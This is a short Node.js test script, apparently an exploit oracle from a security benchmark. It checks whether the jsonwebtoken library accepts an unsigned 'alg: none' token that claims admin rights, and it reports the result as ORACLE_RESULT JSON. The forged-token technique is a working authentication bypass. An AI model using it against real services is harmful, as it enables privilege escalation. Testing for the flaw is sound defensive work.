const jwt = require('jsonwebtoken');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  const secret = 'shared-secret';

  // Benign operation: prove normal verify path works first
  const benignToken = jwt.sign({ role: 'user', marker: 'benign' }, secret, { algorithm: 'HS256' });
  const benignDecoded = jwt.verify(benignToken, secret);

  if (!benignDecoded || benignDecoded.role !== 'user') {
    throw new Error('Benign verification did not return expected payload');
  }

  operation_completed = true;

  // Malicious operation: unsigned token using alg none
  const maliciousToken = jwt.sign({ role: 'admin', marker: 'malicious' }, '', { algorithm: 'none' });

  try {
    const maliciousDecoded = jwt.verify(maliciousToken, '');
    if (maliciousDecoded && maliciousDecoded.role === 'admin') {
      exploit_succeeded = true;
      evidence = 'Unsigned alg=none token accepted and decoded as role=admin';
    } else {
      exploit_succeeded = true;
      evidence = 'Unsigned alg=none token accepted without throwing';
    }
  } catch (err) {
    exploit_succeeded = false;
    evidence = 'Malicious token rejected: ' + (err && err.message ? err.message : String(err));
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'Setup/module/benign failure: ' + (err && err.message ? err.message : String(err));
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));